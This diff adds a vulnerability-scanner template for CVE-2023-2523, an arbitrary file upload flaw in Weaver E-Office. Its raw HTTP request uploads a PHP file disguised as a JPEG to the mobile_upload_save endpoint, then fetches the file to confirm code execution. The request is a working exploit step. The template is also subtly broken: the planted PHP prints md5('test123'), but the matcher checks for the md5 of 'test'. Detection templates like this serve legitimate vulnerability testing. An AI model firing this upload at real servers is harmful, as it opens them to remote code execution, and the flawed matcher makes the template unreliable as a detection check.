@@ -1,0 +1,49 @@
+id: weaver-eoffice-file-upload
+info:
+  name: Weaver E-Office mobile_upload_save Arbitrary File Upload
+  author: ProjectDiscoveryAI
+  severity: critical
+  description: |
+    Weaver E-Office mobile_upload_save module has a file upload vulnerability due to improper parameter processing. Attackers can exploit this to upload arbitrary files and execute malicious code on the server.
+  classification:
+    cve-id: CVE-2023-2523
+  tags: file-upload, critical
+http:
+  - raw:
+      - |
+        POST /E-mobile/App/Ajax/ajax.php?action=mobile_upload_save HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: multipart/form-data; boundary=--------------------------boundary
+
+        ----------------------------boundary
+        Content-Disposition: form-data; name="upload_quwan"; filename="shell.jpg.php"
+        Content-Type: image/jpeg
+
+        <?php echo md5('test123'); unlink(__FILE__); ?>
+        ----------------------------boundary--
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: regex
+        regex:
+          - "attachment.*\\.php"
+    extractors:
+      - type: regex
+        part: body
+        regex:
+          - "attachment.*\\.php"
+        internal: true
+  - raw:
+      - |
+        GET /{{attachment}} HTTP/1.1
+        Host: {{Hostname}}
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "098f6bcd4621d373cade4e832627b4f6"
